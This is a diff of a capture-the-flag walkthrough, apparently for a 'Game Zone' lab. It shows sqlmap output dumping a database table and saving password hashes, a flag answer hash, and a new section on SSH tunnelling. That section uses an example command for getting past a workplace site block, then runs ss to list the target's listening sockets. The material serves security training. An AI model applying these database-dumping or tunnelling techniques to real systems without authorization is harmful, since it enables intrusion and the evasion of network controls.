@@ -89,8 +89,8 @@ Table: post
 | 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
 | 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
 | 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
-+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
-
++----+--------------------------------+---------------------------------------------------------
+...
 [03:13:03] [INFO] table 'db.post' dumped to CSV file '/home/hacktopuser/.local/share/sqlmap/output/10.49.166.157/dump/db/post.csv'                      ...
 do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
 [03:13:14] [INFO] writing hashes to a temporary file '/tmp/sqlmapkoglbk6r247838/sqlmaphashes-tz21s7dm.txt' 
@@ -170,3 +170,47 @@ logout
 Connection to 10.49.166.157 closed.
 ```
 Answer: 649ac17b1480ac13ef1e4fa579dac95c
+
+# Task 5 Exposing services with reverse SSH tunnels
+
+Reverse SSH port forwarding lets you expose a local service to a remote machine. In other words, a port on the remote server is forwarded back into your local system.
+
+Local port forwarding (-L) works the opposite way. It creates a tunnel like this:
+
+YOU ←— SSH SERVER ←— TARGET
+This means you can “pull” a remote service through an SSH server you control. If a site is blocked on your network, you can forward the traffic through a remote server and access it anyway.
+
+For example:
+```
+ssh -L 9000:imgur.com:80 user@example.com
+```
+When you open http://localhost:9000, your request goes through the SSH server, and that server fetches imgur.com:80 for you. Your local network never sees the direct connection, so the block is bypassed.
+
+What Imgur is
+Imgur is a free image‑hosting website used for uploading, viewing, and sharing pictures, memes, GIFs, and screenshots. It’s popular because it lets you share images quickly without needing an account. That’s why it’s often used in SSH examples — it’s simple, well‑known, and commonly blocked in workplaces.
+
+## Q1 We will use a tool called ss to investigate sockets running on a host. How many TCP sockets are running?
+
+If we run ss -tulpn it will tell us what socket connections are running
+
+Argument	Description
+-t	Display TCP sockets
+-u	Display UDP sockets
+-l	Displays only listening sockets
+-p	Shows the process using the socket
+-n	Doesn't resolve service names
+
+Answer: 5 TCP only.
+
+```
+agent47@gamezone:~$ ss -tulpn
+Netid State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
+udp   UNCONN     0      0        *:68                   *:*                  
+udp   UNCONN     0      0        *:10000                *:*                  
+tcp   LISTEN     0      80     127.0.0.1:3306                 *:*                  
+tcp   LISTEN     0      128      *:10000                *:*                  
+tcp   LISTEN     0      128      *:22                   *:*                  
+tcp   LISTEN     0      128     :::80                  :::*                  
+tcp   LISTEN     0      128     :::22                  :::*                  
+agent47@gamezone:~$ ss -tulp
+```
